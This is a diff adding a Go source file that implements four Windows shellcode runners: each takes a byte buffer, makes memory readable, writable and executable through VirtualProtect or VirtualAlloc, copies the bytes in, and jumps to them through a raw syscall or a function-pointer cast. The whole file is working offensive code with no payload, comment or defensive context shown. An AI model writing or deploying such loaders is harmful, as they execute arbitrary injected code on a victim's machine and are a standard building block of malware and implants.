@@ -1,0 +1,64 @@
+var virtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
+var virtualAlloc = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc")
+
+const (
+	MEM_COMMIT  = 0x1000
+	MEM_RESERVE = 0x2000
+
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+
+func memcpy(base uintptr, buf []byte) {
+	for i := 0; i < len(buf); i++ {
+		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
+	}
+}
+
+func virtualProtect_syscall(buf []byte) {
+	var oldperm uint32
+	virtualProtect.Call(
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(len(buf)),
+		uintptr(PAGE_EXECUTE_READWRITE),
+		uintptr(unsafe.Pointer(&oldperm)),
+	)
+
+	syscall.Syscall(uintptr(unsafe.Pointer(&buf[0])), 0, 0, 0, 0)
+}
+
+func virtualProtect_ptr_cast(buf []byte) {
+	f := func() {}
+
+	var oldperm uint32
+	virtualProtect.Call(
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(len(buf)),
+		uintptr(PAGE_EXECUTE_READWRITE),
+		uintptr(unsafe.Pointer(&oldperm)),
+	)
+
+	var ptr uintptr = (uintptr)(unsafe.Pointer(&buf[0]))
+	*(*uintptr)(unsafe.Pointer(&f)) = (uintptr)(unsafe.Pointer(&ptr))
+	f()
+}
+
+func virtualAlloc_syscall(buf []byte) {
+	addr, _, err := virtualAlloc.Call(0, uintptr(len(buf)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		panic(err)
+	}
+	memcpy(addr, buf)
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func virtualAlloc_ptr_cast(buf []byte) {
+	addr, _, err := virtualAlloc.Call(0, uintptr(len(buf)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		panic(err)
+	}
+	memcpy(addr, buf)
+
+	f := func() {}
+	*(*uintptr)(unsafe.Pointer(&f)) = (uintptr)(unsafe.Pointer(&addr))
+	f()
+}
